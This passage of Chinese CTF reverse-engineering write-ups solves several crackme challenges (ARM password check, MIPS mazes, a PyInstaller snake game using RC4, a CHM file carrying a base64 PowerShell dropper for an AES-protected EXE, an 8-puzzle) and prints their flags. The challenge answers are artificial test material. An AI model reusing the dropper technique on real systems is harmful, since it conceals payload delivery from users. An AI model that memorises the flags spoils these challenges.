\\x08\\x00\\xa0\\xe1\\x09\\x10\\xa0\\xe1\\x0a\\x20\\xa0\\xe1\\x00\\x30\\xa0\\xe3\\x00\\x50\\xa0\\xe3\\x00\\x40\\xd0\\xe5\\x01\\x00\\x55\\xe3\\x01\\x00\\x00\\x1a\\x03\\x60\\x03\\xe2\\x06\\x40\\x84\\xe0\\x06\\x40\\x84\\xe2\\x01\\x50\\x04\\xe2\\x00\\x40\\xc1\\xe5\\x01\\x00\\x80\\xe2\\x01\\x10\\x81\\xe2\\x01\\x30\\x83\\xe2\\x02\\x00\\x53\\xe1\\xf2\\xff\\xff\\xba\\x00\\x00\\xa0\\xe3\\x00\\x10\\xa0\\xe3\\x00\\x20\\xa0\\xe3\\x00\\x30\\xa0\\xe3\\x00\\x40\\xa0\\xe3\\x00\\x50\\xa0\\xe3\\x00\\x60\\xa0\\xe3\\x00\\x70\\xa0\\xe3\\x00\\x90\\xa0\\xe3\\x00\\xa0\\xa0\\xe3 test_pw: \\x09\\x00\\xa0\\xe1\\x0a\\x10\\xa0\\xe1\\x08\\x30\\xa0\\xe1\\x00\\x40\\xa0\\xe3\\x00\\x50\\xa0\\xe3\\x00\\xc0\\xa0\\xe3\\x00\\x20\\xd0\\xe5\\x00\\x60\\xd1\\xe5\\x05\\x60\\x86\\xe2\\x01\\xc0\\x04\\xe2\\x00\\x00\\x5c\\xe3\\x00\\x00\\x00\\x0a\\x03\\x60\\x46\\xe2\\x06\\x00\\x52\\xe1\\x05\\x00\\x00\\x1a\\x01\\x00\\x80\\xe2\\x01\\x10\\x81\\xe2\\x01\\x40\\x84\\xe2\\x03\\x00\\x54\\xe1\\xf1\\xff\\xff\\xba\\x01\\x50\\xa0\\xe3\\x00\\x00\\xa0\\xe3\\x00\\x10\\xa0\\xe3\\x00\\x20\\xa0\\xe3\\x00\\x30\\xa0\\xe3\\x00\\x40\\xa0\\xe3\\x00\\x60\\xa0\\xe3\\x00\\x70\\xa0\\xe3\\x00\\x80\\xa0\\xe3\\x00\\x90\\xa0\\xe3\\x00\\xa0\\xa0\\xe3\\x00\\xc0\\xa0\\xe3 直接转换得到的是乱码，卡了一会儿后才发现js源码中出现了“ARM”，同时Unicorn.js里也有不少“ARM”： 百度了一下发现是一种CPU，并找到一个十六进制与ARM代码的转换器：http://armconverter.com/hextoarm/ 把text_pw和enc_pw得到的十六进制字符串去掉前面的\\x并用转换器转换一下，得到以下汇编代码： enc_pw: MOV R0, R8MOV R1, SBMOV R2, SLMOV R3, #0MOV R5, #0LDRB R4, [R0]CMP R5, #1BNE #0x28AND R6, R3, #3ADD R4, R4, R6ADD R4, R4, #6AND R5, R4, #1STRB R4, [R1]ADD R0, R0, #1ADD R1, R1, #1ADD R3, R3, #1CMP R3, R2BLT #0x14MOV R0, #0MOV R1, #0MOV R2, #0MOV R3, #0MOV R4, #0MOV R5, #0MOV R6, #0MOV R7, #0MOV SB, #0MOV SL, #0 test_pw: MOV R0, SBMOV R1, SLMOV R3, R8MOV R4, #0MOV R5, #0MOV IP, #0LDRB R2, [R0]LDRB R6, [R1]ADD R6, R6, #5AND IP, R4, #1CMP IP, #0 BEQ #0x34SUB R6, R6, #3CMP R2, R6BNE #0x54ADD R0, R0, #1ADD R1, R1, #1ADD R4, R4, #1CMP R4, R3BLT #0x18MOV R5, #1MOV R0, #0MOV R1, #0MOV R2, #0MOV R3, #0MOV R4, #0MOV R6, #0MOV R7, #0MOV R8, #0MOV SB, #0MOV SL, #0MOV IP, #0 完全不懂汇编的本渣渣表示彻底懵了，难道Web和逆向都精通才是未来的趋势吗？？？ 这其实是道逆向题。（雾） 于是只好去搜了wp，发现上面的汇编码用Python写是这样的： enc_pw： def enc_pw(s): res = '' f = 0 for i, c in enumerate(s): c = ord(c) if f == 1: c += i &amp; 3 c += 6 f = c &amp; 1 res += chr(c) return res test_pw： def test_pw(s, t): for i, (c, d) in enumerate(zip(s, t)): c, d = ord(c), ord(d) c += 5 if i &amp; 1: c -= 3 if c != d: return 0 return 1 解密脚本： import stringdef enc_pw(s): res = '' f = 0 for i, c in enumerate(s): c = ord(c) if f == 1: c += i &amp; 3 c += 6 f = c &amp; 1 res += chr(c) return resencrypted = 'XYzaSAAX_PBssisodjsal_sSUVWZYYYb'flag = ''for i, c in enumerate(encrypted): c = ord(c) c -= 5 if i &amp; 1 != 0: c += 3 for d in string.printable: if enc_pw(flag + d)[i] == chr(c): flag += d break print flag 跑一下这个脚本得到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://github.com/gha01un/gha01un.github.io/tags/Web/"}],"author":"H1un"},{"title":"XCTF-华为专场","slug":"[12.20] 华为云专场","date":"2021-01-06T13:51:14.710Z","updated":"2021-01-11T02:06:21.130Z","comments":true,"path":"2021/01/06/[12.20] 华为云专场/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2021/01/06/[12.20]%20%E5%8D%8E%E4%B8%BA%E4%BA%91%E4%B8%93%E5%9C%BA/","excerpt":"华为三场比赛","text":"华为三场比赛 [12.23] 鲲鹏计算专场mipsmips架构。 ida反编译以后可以看到 v4是我们输入的字符串，很明显是迷宫逻辑，上下左右用wasd走，迷宫存在dword_100111F0里。 sub_10000744()这个初始函数是用来找起点用的（就是迷宫中3所在的地方，在后面可以看到3其实表示的是当前位置）。 这里也可以看到应该有多个迷宫（dword_10011D10是用来表示第几个迷宫的，且&lt;=2，一个迷宫有225个数）+一个迷宫宽为15=三个迷宫，每个迷宫为15*15。 然后就是下面的四个函数，随便挑一个出来（比如sub_10000D28()）可以看到 很明显是个往右走的函数，3表示当前位置，并把上一个当前位置标为1（可走路径）。并且可以看到终点是4，就是说我们要把每个迷宫从3走到4。 dump迷宫数组，写脚本打印迷宫： aMap=[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 3, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 3, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0]for i in range(45): for j in range(15): if aMap[i*15+j]==0: tmp='*' elif aMap[i*15+j]==1: tmp='.' elif aMap[i*15+j]==3: tmp='@' else: tmp='#' print(tmp,end='') print() if i==14 or i==29: print() 可以看到打印出了三个迷宫，为了看得清楚所以选用几个特定字符打印。 .....**********.....*@*.******.....*.*.******.....*.*.******.....*.*.....**.....*.*****.**.....*.*****.**.....*.*****..*.....*........*.....********#*...........................................................................#sssssssddddddds..*************..*@*....******..*.****.******..*.****.******..*..***.....**..*..*******.**..*..*******.**..*..*****....*..*..*****.**.*..*..*****.****..*......*.*..*..*...........*..***********#*..............................#ssssssssssdddddddddds****************@..**************.*...**********...*.***********.**.********..*.**.*********...**.**************.**************....**************.**************.**************.**************....**************.**************#*#ddssddwddssssssdddssssdddss 走迷宫，然后把路径拼起来，根据提示转md5，get flag。 （有个疑惑哈，第二个迷宫理论上说就算是最短路也有多解？是题目出锅了还是我哪里看漏了= = （再补一句，题目似乎甚至没要求最短路？？？神奇.jpg import hashlibs=b\"sssssssdddddddsssssssssssddddddddddsddssddwddssssssdddssssdddss\"print(\"flag&#123;%s&#125;\"%hashlib.md5(s).hexdigest()) flag{999ea6aa6c365ab43eec2a0f0e5968d5} pypy把题目文件拖进ida，搜索字符串能看到 猜测是pyinstaller打包的文件。 也就是这个题让我突然发现pyinstaller还能打包成elf的，于是比赛结束以后赶紧把之前总结的解包指南更新了：RE套路 - 关于pyinstaller打包文件的复原 | c10udlnk_Log。 走流程解包，得到python源码。 看到这种混淆变量名，果断替换成ida style变量名（。 放一下源码： # uncompyle6 version 3.7.4# Python bytecode 3.8 (3413)# Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)]# Warning: this version of Python has problems handling the Python 3 \"byte\" type in constants properly.# Embedded file name: main.py# Compiled at: 1995-09-28 00:18:56# Size of source mod 2**32: 257 bytesimport random, codecs, sys, time, pygamefrom pygame.locals import *from collections import dequeSCREEN_WIDTH = 600SCREEN_HEIGHT = 480SIZE = 20LINE_WIDTH = 1flag = 'flag&#123;this is a fake flag&#125;'SCOPE_X = (0, SCREEN_WIDTH // SIZE - 1)SCOPE_Y = (2, SCREEN_HEIGHT // SIZE - 1)FOOD_STYLE_LIST = [(10, (255, 100, 100)), (20, (100, 255, 100)), (30, (100, 100, 255))]LIGHT = (100, 100, 100)DARK = (200, 200, 200)BLACK = (0, 0, 0)RED = (200, 30, 30)BGCOLOR = (40, 40, 60)def print_text(v1, v2, v3, v4, v5, fcolor=(255, 255, 255)): v6 = v2.render(v5, True, fcolor) v1.blit(v6, (v3, v4))def init_snake(): v7 = deque() v7.append((2, SCOPE_Y[0])) v7.append((1, SCOPE_Y[0])) v7.append((0, SCOPE_Y[0])) return v7def create_food(v8): v9 = random.randint(SCOPE_X[0], SCOPE_X[1]) v10 = random.randint(SCOPE_Y[0], SCOPE_Y[1]) while (v9, v10) in v8: v9 = random.randint(SCOPE_X[0], SCOPE_X[1]) v10 = random.randint(SCOPE_Y[0], SCOPE_Y[1]) return ( v9, v10)def get_food_style(): return FOOD_STYLE_LIST[random.randint(0, 2)]DEFAULT_KEY = u'Y\\xf3\\x02\\xc3%\\x9a\\x820\\x0b\\xbb%\\x7f~;\\xd2\\xdc'def rc4(v11, key=DEFAULT_KEY, skip=1024): v12 = 0 v13 = bytearray([v14 for v14 in range(256)]) v12 = 0 for v15 in range(256): v12 = (v12 + v13[v15] + ord(key[(v15 % len(key))])) % 256 v16 = v13[v15] v17 = v13[v12] v13[v15] = v13[v12] v13[v12] = v16 else: v12 = 0 v18 = 0 v19 = [] if skip &gt; 0: for v15 in range(skip): v12 = (v12 + 1) % 256 v18 = (v18 + v13[v12]) % 256 v13[v12], v13[v18] = v13[v18], v13[v12] for v20 in v11: v12 = (v12 + 1) % 256 v18 = (v18 + v13[v12]) % 256 v13[v12], v13[v18] = v13[v18], v13[v12] v21 = v13[((v13[v12] + v13[v18]) % 256)] v19.append(chr(ord(v20) ^ v21)) else: return ''.join(v19)def func(v22): v23 = rc4(v22) if v23.encode('utf-8').hex() == '275b39c381c28b701ac3972338456022c2ba06c3b04f5501471c47c38ac380c29b72c3b5c38a7ec2a5c2a0': return 'YOU WIN' return 'YOU LOSE'def main(): pygame.init() v24 = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT)) pygame.display.set_caption(u'\\u8d2a\\u5403\\u86c7') v25 = pygame.font.SysFont('SimHei', 24) v26 = pygame.font.Font(None, 72) v27, v28 = v26.size('GAME OVER') v29 = True v30 = init_snake() v31 = create_food(v30) v32 = get_food_style() v33 = (1, 0) v34 = True v35 = False v36 = 0 v37 = 0.5 v38 = v37 v39 = None v41 = False for v40 in pygame.event.get(): if v40.type == QUIT: sys.exit() elif v40.type == KEYDOWN: if v40.key == K_RETURN: if v34: v35 = True v34 = False v29 = True v30 = init_snake() v31 = create_food(v30) v32 = get_food_style() v33 = (1, 0) v36 = 0 v39 = time.time() elif v40.key == K_SPACE: if not v34: v41 = not v41 elif v40.key in (K_w, K_UP): if v29: v33 = v33[1] or (0, -1) v29 = False elif v40.key in (K_s, K_DOWN): if v29: v33 = v33[1] or (0, 1) v29 = False elif v40.key in (K_a, K_LEFT): if v29: if not v33[0]: v33 = (-1, 0) v29 = False elif v40.key in (K_d, K_RIGHT): if v29: if not v33[0]: v33 = (1, 0) v29 = False else: v24.fill(BGCOLOR) for v42 in range(SIZE, SCREEN_WIDTH, SIZE): pygame.draw.line(v24, BLACK, (v42, SCOPE_Y[0] * SIZE), (v42, SCREEN_HEIGHT), LINE_WIDTH) else: for v43 in range(SCOPE_Y[0] * SIZE, SCREEN_HEIGHT, SIZE): pygame.draw.line(v24, BLACK, (0, v43), (SCREEN_WIDTH, v43), LINE_WIDTH) else: v44 = v34 or time.time() if v44 - v39 &gt; v38 and not v41: v29 = True v39 = v44 v45 = (v30[0][0] + v33[0], v30[0][1] + v33[1]) if v45 == v31: v30.appendleft(v45) v36 += v32[0] v38 = v37 - 0.03 * (v36 // 100) v31 = create_food(v30) v32 = get_food_style() else: if SCOPE_X[0] &lt;= v45[0] &lt;= SCOPE_X[1]: if SCOPE_Y[0] &lt;= v45[1] &lt;= SCOPE_Y[1]: if v45 not in v30: v30.appendleft(v45) v30.pop() else: v34 = True if not v34: pygame.draw.rect(v24, v32[1], (v31[0] * SIZE, v31[1] * SIZE, SIZE, SIZE), 0) for v46 in v30: pygame.draw.rect(v24, DARK, (v46[0] * SIZE + LINE_WIDTH, v46[1] * SIZE + LINE_WIDTH, SIZE - LINE_WIDTH * 2, SIZE - LINE_WIDTH * 2), 0) else: print_text(v24, v25, 30, 7, f\"speed: &#123;v36 // 100&#125;\") print_text(v24, v25, 450, 7, f\"score: &#123;v36&#125;\") if v36 &gt;= 5192296858534827628530496329220096: v47 = flag print_text(v24, v26, (SCREEN_WIDTH - v27) // 2, (SCREEN_HEIGHT - v28) // 2, func(v47), RED) if v34: if v35: print_text(v24, v26, (SCREEN_WIDTH - v27) // 2, (SCREEN_HEIGHT - v28) // 2, 'GAME OVER', RED) pygame.display.update()if __name__ == '__main__': main()# okay decompiling main.pyc 可以看到最后getflag这里（func()）的程序逻辑就一个rc4加密，由rc4的特性可知加密和解密流程相同，故复用程序中的rc4()来得到flag。 uncompyle反编译出来的源码是python3，但是题目本身的源码是python2，注意编码问题。 关于编码问题，可以看： Unicode之痛 — PyCoder’s Weelky CN 关于python2中的unicode和str以及python3中的str和bytes - 明王不动心 - 博客园 这里因为反编译做了转换成python3的处理，所以脚本用python3写。 DEFAULT_KEY = u'Y\\xf3\\x02\\xc3%\\x9a\\x820\\x0b\\xbb%\\x7f~;\\xd2\\xdc'def rc4(v11, key=DEFAULT_KEY, skip=1024): v12 = 0 v13 = bytearray([v14 for v14 in range(256)]) v12 = 0 for v15 in range(256): v12 = (v12 + v13[v15] + ord(key[(v15 % len(key))])) % 256 v16 = v13[v15] v17 = v13[v12] v13[v15] = v13[v12] v13[v12] = v16 else: v12 = 0 v18 = 0 v19 = [] if skip &gt; 0: for v15 in range(skip): v12 = (v12 + 1) % 256 v18 = (v18 + v13[v12]) % 256 v13[v12], v13[v18] = v13[v18], v13[v12] for v20 in v11: v12 = (v12 + 1) % 256 v18 = (v18 + v13[v12]) % 256 v13[v12], v13[v18] = v13[v18], v13[v12] v21 = v13[((v13[v12] + v13[v18]) % 256)] v19.append(chr(ord(v20) ^ v21)) else: return ''.join(v19)# def func(v22):# v23 = rc4(v22)# if v23.encode('utf-8').hex() == '275b39c381c28b701ac3972338456022c2ba06c3b04f5501471c47c38ac380c29b72c3b5c38a7ec2a5c2a0':# return 'YOU WIN'# return 'YOU LOSE'# -=-=-=以上所有为源码中原函数-=-=-=cipher='275b39c381c28b701ac3972338456022c2ba06c3b04f5501471c47c38ac380c29b72c3b5c38a7ec2a5c2a0'flag=bytes.fromhex(cipher).decode('utf-8')print(rc4(flag)) flag{snake_bao_is_really_lucky} print【TODO】【TODO】 这个题感觉大概知道怎么做，但就是不会啊（等wp… 贴一下当时的想法，看了看逻辑只有sprintf这种函数，除此以外没有别的可以改写内存数据的操作了。 动态调试跟了一下，猜测是sprintf格式化字符串漏洞写入？ Introduction to format string exploits sprintf - stm32学习中 - 博客园 pwn太菜了还没搞懂要怎么往output那里写（虽然这是逆向题orz setup函数那里有一些format的初始化，主要是loop()那里，控制input（输入的字符串，全部为可见字符且长度&gt;11），来改变使得output!=原来的output且output-1==48(‘0’)。 [12.27] HarmonyOS和HMS专场re123用file命令可以看到是MS Windows HtmlHelp Data文件（即.chm），查看文件头也可以知道。 所以添加后缀名.chm。 关于chm文件有一个常用的反编译器ChmDecompiler，可以释放CHM里面的全部源文件（包括网页、文本、图片、CHM、ZIP、EXE等全部源文件），并且完美地恢复源文件的全部目录结构 （摘抄的简介。 所以用ChmDecompiler打开re.chm，解压缩，可以看到目录下出现一个包含四个文件的文件夹（其实源文件只有三个，.hhp是ChmDecompiler自动生成的）。 一个一个翻可以看到doc.htm里有一段奇怪的Item1。 大概可以看到是powershell的语法？（感觉像win后门，这么多no的参数 查了一下其实就是把后面那大段进行base64解码而已，用wsl解一下base64有 然后得到了一段.NET代码（白字）。 通过查微软文档可以知道，这里是把base64解码以后的字符进行Deflate解压的过程，所以用脚本把中间那段base64解码，并整理输出。 import base64import zlib def deflate(data): try: return zlib.decompress(data, -zlib.MAX_WBITS) except zlib.error: return zlib.decompress(data)code='TY5BC4IwGIbvgv9hjB2McJhEhNChJMGTkN2qg7qvFHQT/bL575vpoV2/53n2skJJBInkQG5xwqOqhkcQXCATx7q+gkaHsvYj7kIVvCgburItVgm9MTxbVB5LATp5OlQvb6IMV0LdQvdPpu+8x66SL2eOrMl+Ck7naUA69ggND5UcoEOzI+pUc8p62G3TRZubv34K6IbLespADoGR27vv+R7HpqXzt8Q9y0IJI5N8RLCtLw=='de_code=deflate(base64.b64decode(code)).decode()for x in de_code.split('\\r\\n'): print(x) 很明显的逻辑了，把doc.chm（应该是原来的re.chm）中”xxxxxxxx”后面的部分提取出来，还是用base64解码得到文件。 把这后面的内容手动复制出来到cont.txt里，进行base64解码，最后存在theFile中。 base64 -d cont.txt &gt; theFile 查看theFile可以猜测是exe（毕竟最开始给的就是有powershell指令的base64），把文件头补上，并改后缀名（即theFile.exe）。 用ida打开，通过FindCrypt插件可以看到AES，跟过去能看到AES加密时的S盒（其实这里前两个都是S盒，第三个是逆S盒），猜测用到了AES加密。 往上回溯找到主函数 显然，这里是AES加密过程，sub_180001100()是密钥拓展过程，sub_1800015B0()是AES加密。 看了一下感觉是原装无魔改的AES，密文密钥都给了，那就直接写脚本解密。 注意这里是以整数形式给出的，别忘了小端序。 from Crypto.Cipher import AESfrom binascii import *arr=[0x16157E2B,0xA6D2AE28,0x8815F7AB,0x3C4FCF09]key=\"\"for i in range(4): key=hex(arr[i])[2:]+keykey=unhexlify(key)[::-1] #注意小端序的问题tmp=0x46C42084AA2A1B56E799D643453FF4B5cipher=unhexlify(hex(tmp)[2:])[::-1]enc=AES.new(key,AES.MODE_ECB)print(enc.decrypt(cipher)) flag{youcangues} puzzlemips架构。 加载进ida以后，通过字符串回溯找到主函数。 可以看到很明显的sub_401134()这个check，先往这里面看。 看到是一个疑似maze的逻辑（ 不过sub_400FA8()点进去以后可以看到是swap的功能 所以应该不是maze，是一个以交换为主的逻辑。 至于dword_4A0010，可以看到是一个九个数的数组。 v4和v5的出处在switch逻辑上面一点 可以看到最后(v4,v5)其实表示了数组里0的位置，且数组实际可以看成是3*3。 即： 4 0 37 2 68 1 5 最后sub_400FFC()的检查逻辑： 实际上就是要让这个3*3等于 1 2 34 5 67 8 0 把0看成空位的话，很容易就想到3*3的华容道了。 （或者玩算法的小伙伴可能对八数码问题这个名字更熟悉？ 有本事下次出数织啊！20*20我都给你火速解出来（来自数织爱好者的吐槽） 这里实际上是求最短能得到的路径（15步），懒得想了，直接去网上抓了个现成代码下来改了改。 #include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;ctime&gt;#include &lt;cstdlib&gt;#define maxState 10000#define N 3using namespace std;bool isEqual(int a[N][N][maxState],int b[N][N],int n)&#123; for(int i = 0;i &lt; N;i ++)&#123; for(int j = 0;j &lt; N;j ++)&#123; if(a[i][j][n] != b[i][j]) return false; &#125; &#125; return true;&#125;bool isEqual(int a[N][N],int b[N][N])&#123; for(int i = 0;i &lt; N;i ++)&#123; for(int j = 0;j &lt; N;j ++)&#123; if(a[i][j] != b[i][j]) return false; &#125; &#125; return true;&#125;int evalute(int state[N][N],int target[N][N])&#123; int num = 0; for(int i = 0;i &lt; N;i ++)&#123; for(int j = 0;j &lt; N;j ++) if(state[i][j] != target[i][j]) num ++; &#125; return num;&#125;void findBrack(int a[N][N],int x,int y)&#123; for(int i = 0;i &lt; N;i ++)&#123; for(int j = 0;j &lt; N;j ++)&#123; if(a[i][j] == 0) &#123; x = i;y = j;return; &#125; &#125; &#125;&#125;bool move(int a[N][N],int b[N][N],int dir)&#123; //1 up 2 down 3 left 4 right int x = 0,y = 0; for(int i = 0;i &lt; N;i ++)&#123; for(int j = 0;j &lt; N;j ++)&#123; b[i][j] = a[i][j]; if(a[i][j] == 0) &#123; x = i;y = j; &#125; &#125; &#125; if(x == 0 &amp;&amp; dir == 1) return false; if(x == N-1 &amp;&amp; dir == 2) return false; if(y == 0 &amp;&amp; dir == 3) return false; if(y == N-1 &amp;&amp; dir == 4) return false; if(dir == 1)&#123;b[x-1][y] = 0;b[x][y] = a[x-1][y];&#125; else if(dir == 2)&#123;b[x+1][y] = 0;b[x][y] = a[x+1][y];&#125; else if(dir == 3)&#123;b[x][y-1] = 0;b[x][y] = a[x][y-1];&#125; else if(dir == 4)&#123;b[x][y+1] = 0;b[x][y] = a[x][y+1];&#125; else return false; return true;&#125;void statecpy(int a[N][N][maxState],int b[N][N],int n)&#123; for(int i = 0;i &lt; N;i ++)&#123; for(int j = 0;j &lt; N;j ++)&#123; a[i][j][n] = b[i][j]; &#125; &#125;&#125;void getState(int a[N][N][maxState],int b[N][N],int n)&#123; for(int i = 0;i &lt; N;i ++)&#123; for(int j = 0;j &lt; N;j ++)&#123; b[i][j] = a[i][j][n]; &#125; &#125;&#125;void statecpy(int a[N][N],int b[N][N])&#123; for(int i = 0;i &lt; N;i++)&#123; for(int j = 0;j &lt; N;j++) a[i][j] = b[i][j]; &#125;&#125;int checkAdd(int a[N][N][maxState],int b[N][N],int n)&#123; for(int i = 0;i &lt; n;i ++)&#123; if(isEqual(a,b,i)) return i; &#125; return -1;&#125;int Astar(int a[N][N][maxState],int start[N][N],int target[N][N],int path[maxState])&#123; bool visited[maxState] = &#123;false&#125;; int fitness[maxState] = &#123;0&#125;; int passLen[maxState] = &#123;0&#125;; int curpos[N][N]; statecpy(curpos,start); int id = 0,Curid = 0; fitness[id] = evalute(curpos,target); statecpy(a,start,id++); while(!isEqual(curpos,target))&#123; for(int i = 1;i &lt; 5;i ++)&#123;//向四周找方向 int tmp[N][N] = &#123;0&#125;; if(move(curpos,tmp,i))&#123; int state = checkAdd(a,tmp,id); if(state == -1)&#123;//not add path[id] = Curid; passLen[id] = passLen[Curid] + 1; fitness[id] = evalute(tmp,target) + passLen[id]; statecpy(a,tmp,id++); &#125;else&#123;//add int len = passLen[Curid] + 1,fit = evalute(tmp,target) + len; if(fit &lt; fitness[state])&#123; path[state] = Curid; passLen[state] = len; fitness[state] = fit; visited[state] = false; &#125; &#125; &#125; &#125; visited[Curid] = true; //找到适应度最小的最为下一个带搜索节点 int minCur = -1; for(int i = 0;i &lt; id;i ++) if(!visited[i] &amp;&amp; (minCur == -1 || fitness[i] &lt; fitness[minCur])) minCur = i; Curid = minCur; getState(a,curpos,Curid); if(id == maxState) return -1; &#125; return Curid;&#125;void show(int a[N][N][maxState],int n)&#123; cout &lt;&lt; \"-------------------------------\\n\"; for(int i = 0;i &lt; N;i ++)&#123; for(int j =0;j &lt; N;j ++)&#123; cout &lt;&lt; a[i][j][n] &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; &#125; cout &lt;&lt; \"-------------------------------\\n\";&#125;int calDe(int a[N][N])&#123; int sum = 0; for(int i = 0;i &lt; N*N;i ++)&#123; for(int j = i+1;j &lt; N*N;j ++)&#123; int m,n,c,d; m = i/N;n = i%N; c = j/N;d = j%N; if(a[c][d] == 0) continue; if(a[m][n] &gt; a[c][d]) sum ++; &#125; &#125; return sum;&#125;void autoGenerate(int a[N][N])&#123; int maxMove = 50; srand((unsigned)time(NULL)); int tmp[N][N]; while(maxMove --)&#123; int dir = rand()%4 + 1; if(move(a,tmp,dir)) statecpy(a,tmp); &#125;&#125;int main()&#123; int a[N][N][maxState] = &#123;0&#125;; // int start[N][N] = &#123;1,2,3,4,5,6,7,8,0&#125;; // autoGenerate(start); // cout &lt;&lt; start[0][0] &lt;&lt; start[1][1]; int start[N][N] = &#123;4,0,3,7,2,6,8,1,5&#125;; int target[N][N] = &#123;1,2,3,4,5,6,7,8,0&#125;; if(!(calDe(start)%2 == calDe(target)%2))&#123; cout &lt;&lt; \"无解\\n\"; return 0; &#125; int path[maxState] = &#123;0&#125;; int res = Astar(a,start,target,path); if(res == -1)&#123; cout &lt;&lt; \"达到最大搜索能力\\n\"; return 0; &#125; int shortest[maxState] = &#123;0&#125;,j = 0; while(res != 0)&#123; shortest[j++] = res; res = path[res]; &#125; cout &lt;&lt; \"第 0 步\\n\"; show(a,0); for(int i = j - 1;i &gt;= 0;i --)&#123; cout &lt;&lt; \"第 \" &lt;&lt; j-i &lt;&lt; \" 步\\n\"; show(a,shortest[i]); &#125; return 0;&#125; 得到每一步的情况，进而根据switch写出路径。 第 0 步-------------------------------4 0 37 2 68 1 5-------------------------------第 1 步-------------------------------4 2 37 0 68 1 5-------------------------------第 2 步-------------------------------4 2 37 1 68 0 5-------------------------------第 3 步-------------------------------4 2 37 1 68 5 0-------------------------------第 4 步-------------------------------4 2 37 1 08 5 6-------------------------------第 5 步-------------------------------4 2 07 1 38 5 6-------------------------------第 6 步-------------------------------4 0 27 1 38 5 6-------------------------------第 7 步-------------------------------4 1 27 0 38 5 6-------------------------------第 8 步-------------------------------4 1 27 5 38 0 6-------------------------------第 9 步-------------------------------4 1 27 5 30 8 6-------------------------------第 10 步-------------------------------4 1 20 5 37 8 6-------------------------------第 11 步-------------------------------0 1 24 5 37 8 6-------------------------------第 12 步-------------------------------1 0 24 5 37 8 6-------------------------------第 13 步-------------------------------1 2 04 5 37 8 6-------------------------------第 14 步-------------------------------1 2 34 5 07 8 6-------------------------------第 15 步-------------------------------1 2 34 5 67 8 0-------------------------------6 左2 上4 右8 下// 884226886224488 路径为“884226886224488”。 